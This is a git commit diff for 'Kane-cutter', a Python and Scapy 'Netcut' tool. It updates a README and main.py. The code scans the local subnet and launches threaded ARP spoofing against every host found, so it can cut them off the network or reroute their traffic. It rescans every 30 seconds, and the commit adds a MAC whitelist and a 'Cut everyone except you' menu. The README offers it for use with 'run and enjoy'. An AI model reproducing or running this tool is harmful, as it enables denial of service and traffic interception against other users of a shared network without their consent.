d084b3ceed110a7b6c63f7ba697a52e807d1876a
Tu Minh Hieu <hieu.tu@evizi.com>
2021-01-11 12:27:10 +0700

    Add White list and fix bugs, Enhance scanning and control threads

--- README.md
+++ README.md
@@ -1,2 +1,41 @@
-# Kanecutter
-Netcut using python and scapy
+## Kane-cutter
+The Netcut program using `Python 3.7` and `Scapy`
+
+Running this program by following steps:
+
+**Step 1** Install the dependencies in `pyproject.toml`
+
+```
+poetry install
+```
+
+**Step 2** Install latest Npcap in https://nmap.org/npcap/ it work well with version `1.10`
+
+**Step 3** Run `python main.py` and enjoy
+
+## Features
+
+1. Cut everyone in the network
+2. Scan the network
+3. Set the white list
+
+![ARP-Spoofing-diagram](kane-cutter.png)
+This program will scan the network which is your local machine connect on
+and do the ARP Spoofing attack, you can set the white list wishing to be safe
+by this attacking
+
+## Knowledge
+
+ARP Spoofing is the technique of redirecting the network traffic to the hacker
+by faking the IP address
+
+In simple terms: When there is a connection between a system and the router 
+(basically between two IP addresses), the hacker will fake his/her IP address.
+ The hacker will tell 1) The Router that he/she is the system and 2) 
+ The System that he/she is the router. Now, the router will send the data to 
+ the hacker instead of the system, and the system will send the data to the 
+ hacker instead of the router. Hence the network flows through the hacker.
+
+![ARP-Spoofing-diagram](arp-spoofing-diagram.png)
+
+Read more: https://www.edureka.co/blog/python-arp-spoofer-for-ethical-hacking
--- main.py
+++ main.py
@@ -7,6 +7,8 @@ from scapy.all import send as scapy_send
 from scapy.all import srp
 
 victims = []
+threads = []
+white_lists = []
 
 
 def get_gateway_info():
@@ -34,10 +36,11 @@ def scan_all_ip_addresses(target_ip):
     ether = Ether(dst="ff:ff:ff:ff:ff:ff")
     # stack them
     packet = ether / arp
-    result = srp(packet, timeout=20, verbose=0)[0]
+    result = srp(packet, timeout=6, verbose=0)[0]
 
     # a list of clients, we will fill this in the upcoming loop
     clients = []
+
     for sent, received in result:
         # for each response, append ip and mac address to `clients` list
         clients.append({"ip_address": received.psrc, "mac_address": received.hwsrc})
@@ -51,26 +54,13 @@ def scan_all_ip_addresses(target_ip):
     return clients
 
 
-def attack_all_and_interval_scan_ip(target_ip, recall_after_second=30):
+def is_in_white_list(mac_address):
     """
-    Attack all victims and interval scanning
-    :param target_ip: the gateway IP of the router
-    :param recall_after_second: recall every seconds
-    :return:
+    Check whether this mac_address is in the white_lists
+    :param mac_address: the MAC Address
+    :return: boolean
     """
-    global victims
-    clients = scan_all_ip_addresses(target_ip)
-    threading.Timer(
-        interval=recall_after_second,
-        function=attack_all_and_interval_scan_ip,
-        args=(target_ip, recall_after_second),
-    ).start()
-    if len(clients) - len(victims) > 0:
-        victims = clients
-        victims_without_you = filter(
-            lambda victim: victim["ip_address"] != get_if_addr(conf.iface), victims
-        )
-        arp_spoofing(victims_without_you)
+    return (False, True)[mac_address in white_lists]
 
 
 def attack(ip_address, mac_address):
@@ -92,58 +82,98 @@ def attack(ip_address, mac_address):
         scapy_send(packet_2, verbose=0)
 
 
+def attack_all_and_interval_scan_ip(target_ip, recall_after_second=30):
+    """
+    Attack all victims and interval scanning
+    :param target_ip: the gateway IP of the router
+    :param recall_after_second: recall every seconds
+    :return:
+    """
+    global victims
+    clients = scan_all_ip_addresses(target_ip)
+    threading.Timer(
+        interval=recall_after_second,
+        function=attack_all_and_interval_scan_ip,
+        args=(target_ip, recall_after_second),
+    ).start()
+    if len(clients) - len(victims) > 0:
+        victims = clients
+        victims_without_you = filter(
+            lambda victim: victim["ip_address"] != get_if_addr(conf.iface), victims
+        )
+        for t in threads:
+            t.stop()
+        arp_spoofing(victims_without_you)
+
+
+def set_the_white_lists():
+    global white_lists
+
+    choice = ""
+    while choice != "quit":
+        choice = input("Add MAC Address(Enter 'quit' for exit):")
+        print("The white lists:")
+        if choice != "quit":
+            white_lists.append(choice)
+        for m in white_lists:
+            print(m)
+
+
 def arp_spoofing(list_victims):
     """
     ARP Spoofing
     :param list_victims: the list of victims
     :return:
     """
-    # Example: list_victims: [{ip_address: "192.168.14.100", mac_address: "00:d2:79:13:b4:ab"}]
+    global threads
+    threads = []
     for victim in list_victims:
-        t = threading.Thread(
-            target=attack, args=(victim["ip_address"], victim["mac_address"])
-        )
+        if not is_in_white_list(victim["mac_address"]):
+            threads.append(threading.Thread(
+                target=attack, args=(victim["ip_address"], victim["mac_address"])
+            ))
+
+    for t in threads:
         t.start()
+
+
+def print_list_of_actions():
+    print("-----------------")
+    print("List of actions:")
+    print("[a] - Cut everyone except you")
+    print("[s] - Scan network")
+    print("[w] - Set the white list")
+    print("[q] - Quit")
 
 
 if __name__ == "__main__":
     print(
-        " ____  __.                                        __     __                      "
+        """
+         ____  __.                                        __     __                      
+         |    |/ _|_____     ____    ____   ____   __ __ _/  |_ _/  |_   ____ _______     
+         |      <  \__  \   /    \ _/ __ \_/ ___\ |  |  \\\   __\\\   __\_/ __ \\\_  __ \ 
+         |    |  \  / __ \_|   |  \\\  ___/\  \___ |  |  / |  |   |  |  \  ___/ |  | \/   
+         |____|__ \(____  /|___|  / \___  >\___  >|____/  |__|   |__|   \___  >|__|       
+                 \/     \/      \/      \/     \/                           \/            
+                                                       --written by kanetu731@gmail.com           
+        """
     )
-    print(
-        "|    |/ _|_____     ____    ____   ____   __ __ _/  |_ _/  |_   ____ _______     "
-    )
-    print(
-        "|      <  \__  \   /    \ _/ __ \_/ ___\ |  |  \\\   __\\\   __\_/ __ \\\_  __ \ "
-    )
-    print(
-        "|    |  \  / __ \_|   |  \\\  ___/\  \___ |  |  / |  |   |  |  \  ___/ |  | \/   "
-    )
-    print(
-        "|____|__ \(____  /|___|  / \___  >\___  >|____/  |__|   |__|   \___  >|__|       "
-    )
-    print(
-        "        \/     \/      \/      \/     \/                           \/            "
-    )
-    print(
-        "                                      --written by kanetu731@gmail               "
-    )
-    print("List of actions:")
-    print("[a] - Cut everyone except you")
-    print("[s] - Scan network")
-    print("[q] - Quit")
 
     input_is_valid = False
     gw_ip_address, _ = get_gateway_info()
 
     while not input_is_valid:
+        print_list_of_actions()
         choice = input(">")
         if choice == "a":
             attack_all_and_interval_scan_ip(gw_ip_address + "/24")
             input_is_valid = True
         elif choice == "s":
             scan_all_ip_addresses(gw_ip_address + "/24")
-            input_is_valid = True
+            input_is_valid = False
+        elif choice == "w":
+            set_the_white_lists()
+            input_is_valid = False
         elif choice == "q":
             exit()
         else:
